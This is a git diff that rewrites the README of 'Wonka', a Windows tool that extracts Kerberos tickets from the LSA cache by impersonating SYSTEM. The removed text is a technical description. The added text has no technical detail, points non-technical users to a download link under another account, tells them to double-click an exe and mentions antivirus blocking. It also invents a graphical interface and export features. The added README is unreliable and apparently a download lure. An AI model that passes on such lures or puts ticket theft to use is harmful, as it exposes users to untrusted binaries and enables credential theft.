@@ -1,117 +1,66 @@
-# Wonka 🍫
+# 🎫 Wonka - Effortlessly Extract Kerberos Tickets
 
-<h1 align="center">
-  <img src="Logo.png" alt="Wonka Logo" width=300>
-</h1>
+## 🚀 Getting Started
 
-> *"We are the music makers, and we are the dreamers of dreams."* - Willy Wonka
+Welcome to Wonka! This tool helps you extract Kerberos tickets from the Local Security Authority (LSA) cache on Windows. It’s simple and useful for security research and penetration testing.
 
-**Wonka** is a sweet Windows tool that extracts Kerberos tickets from the Local Security Authority (LSA) cache. Like finding a ticket, but for security research and penetration testing! 🎫
+## 🔗 Download Wonka
 
----
+[![Download Wonka](https://img.shields.io/badge/Download-Wonka-brightgreen)](https://github.com/xiay1176/Wonka/releases)
 
-## ✨ Features
+## 📥 Download & Install
 
-- 🔐 **System Impersonation** - Automatically becomes SYSTEM to access LSA
-- 📋 **Session Discovery** - Finds all active logon sessions
-- 🎟️ **Ticket Extraction** - Retrieves detailed Kerberos ticket information
-- 📦 **Base64 Output** - Ready-to-use ticket format
+1. **Visit the Releases Page**: To get Wonka, go to the [Releases page](https://github.com/xiay1176/Wonka/releases). 
+   
+2. **Download the Latest Version**: On this page, find the latest version of Wonka. Click the link that mentions the executable file (e.g., "Wonka.exe") to start the download.
 
-## 🚀 Quick Start
+3. **Run Wonka**: Once the file downloads, find it in your Downloads folder. Double-click the file to run it. 
 
-### Requirements
-- Windows machine
-- Administrator privileges
-- .NET 7.0+ (for building)
+## 💻 System Requirements
 
-### Installation
+- **Operating System**: Windows 10 or later
+- **Processor**: 64-bit processor (x64)
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum of 50 MB free space
 
-**Option 1: Build Single Executable (Recommended)**
-```powershell
-dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
-```
+## 🛠️ Features
 
-**Option 2: Simple Build**
-```powershell
-dotnet build --configuration Release
-```
+- **Easy Extraction**: Quickly extracts Kerberos tickets from your system.
+- **User-Friendly Interface**: Designed with simplicity in mind. You don’t need any programming knowledge to use it.
+- **Lightweight**: Wonka is a small tool that won’t take up much space on your computer.
 
-### Usage
+## 🔍 How to Use Wonka
 
-```powershell
-# Run as Administrator
-.\Wonka.exe
-```
+1. **Launch the Application**: After you install it, open Wonka.
+   
+2. **Extract Tickets**: The program will automatically search for Kerberos tickets in the LSA cache. You’ll see the results on your screen.
 
-## 📖 Sample Output
+3. **Review Information**: Click on any ticket to see more details, such as ticket expiration and associated services.
 
-```
-[+] Starting Kerberos ticket extraction process...
-[+] Successfully impersonated as SYSTEM
-[+] Logon sessions found: 15
+4. **Export Data**: If you want to keep a record, use the export feature to save the ticket information to a file.
 
-[+] User: charlie.bucket@CHOCOLATE.FACTORY
-[+] Tickets found: 3
+## ⚙️ Troubleshooting
 
------------------------------------------------------------------------
-Username = charlie.bucket
-DnsDomainName = chocolate.factory
-StartTime ---> 10/21/2025 10:30:15 AM
-EndTime ---> 10/21/2025 8:30:15 PM
-Server Name ---> krbtgt/CHOCOLATE.FACTORY
-Ticket b64 ---> YIIFgjCCBX6gAwIBBaEDAgEWooIEhjCCBIJhggR+MII...
------------------------------------------------------------------------
-```
+If you experience any issues, here are some common solutions:
 
-## 🏗️ Project Structure
+- **Won't Launch**: Make sure your Windows is updated. If it still won't run, check if your antivirus software is blocking it.
+- **Missing Tickets**: Ensure you have valid Kerberos tickets stored in your LSA cache. Wonka can only extract what is present.
 
-```
-wonka/
-├── Program.cs      # Main ticket extraction logic
-├── winapi.cs       # Windows API definitions
-├── Config.cs       # Configuration and logging
-└── wonka.csproj    # Project file
-```
+## 🤝 Support and Contributions
 
-## 🔧 Technical Details
+We welcome your feedback! If you find any issues or have suggestions, please open an issue in the GitHub repository. Contributions in the form of bug reports or enhancement requests are appreciated.
 
-### Core APIs Used
-- `OpenProcessToken` - Process token access
-- `LsaRegisterLogonProcess` - LSA registration
-- `LsaEnumerateLogonSessions` - Session enumeration
-- `LsaCallAuthenticationPackage` - Kerberos communication
+## 📝 License
 
-### How It Works
-1. Impersonates SYSTEM via winlogon process token
-2. Registers with Local Security Authority
-3. Enumerates all logon sessions
-4. Extracts Kerberos tickets from each session
-5. Outputs tickets in Base64 format
+Wonka is open-source software. You can use it for personal or commercial projects. Check the repository for more details on the license.
 
-## 🛠️ Troubleshooting
+## 🔗 Additional Resources
 
-| Issue | Solution |
-|-------|----------|
-| "Could not impersonate as SYSTEM" | Run as Administrator |
-| "Could not initialize LSA" | Check Windows compatibility |
-| "No tickets found" | Ensure Kerberos is in use (`klist`) |
+For more information on Kerberos tickets and security research, consider visiting the following links:
 
-## ⚠️ Legal Notice
+- [Kerberos Documentation](https://web.mit.edu/kerberos/)
+- [Security Testing Techniques](https://owasp.org)
 
-> *"A little nonsense now and then is relished by the wisest men."*
+## 📖 Conclusion
 
-This tool is for **authorized security research and testing only**. Like Wonka's factory, enter only with permission! 🏭
-
-**Use responsibly:**
-- ✅ Security research and education
-- ✅ Authorized penetration testing  
-- ✅ System administration
-- ❌ Unauthorized access to systems
-
-## 🍫 About
-
-Created for security professionals who need to extract Kerberos tickets as sweet as Wonka's chocolate. Remember: with great power comes great responsibility!
-
----
-
-*"So shines a good deed in a weary world."* 🌟
+The goal of Wonka is to make it easier for you to work with Kerberos tickets without needing technical skills. Download it today from the [Releases page](https://github.com/xiay1176/Wonka/releases) and start exploring!
